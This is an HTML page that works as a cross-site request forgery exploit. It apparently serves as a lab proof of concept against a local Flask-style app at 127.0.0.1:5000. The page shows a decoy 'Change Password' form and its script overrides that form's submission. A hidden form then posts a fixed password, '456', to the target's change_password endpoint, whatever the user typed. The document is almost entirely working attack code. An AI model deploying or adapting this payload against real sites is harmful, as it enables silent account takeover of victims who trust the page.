<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <script>
        function submitCSRF(event) {
            // Prevent the default form submission
            event.preventDefault();

            // Submit the hidden CSRF form
            document.getElementById('csrf-form').submit();
        }
        window.onload = function() {
            // Override the original form's submit function
            var form = document.getElementsByTagName('form')[0];
            form.onsubmit = submitCSRF;
        };
    </script>
</head>
<body>
    <div class="container mt-5">
        <div class="row">
            <div class="col-md-6 offset-md-3">
                <h2>Change Password</h2>
                <hr>
                <form method="post">
                    <div class="form-group">
                        <label for="new_password">New Password</label>
                        <input type="password" class="form-control" id="new_password_fake" name="new_password_fake" required>
                    </div>
                    <div class="form-group">
                        <label for="confirm_password">Confirm New Password</label>
                        <input type="password" class="form-control" id="confirm_password_fake" name="confirm_password_fake" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Change Password</button>
                </form>
                <!-- Hidden CSRF form, actual form that will be submitted -->
                <form id="csrf-form" action="http://127.0.0.1:5000/change_password" method="POST" style="display:none;">
                    <input type="hidden" name="new_password" value="456" />
                    <input type="hidden" name="confirm_password" value="456" />
                </form>
            </div>
        </div>
    </div>
</body>
</html>
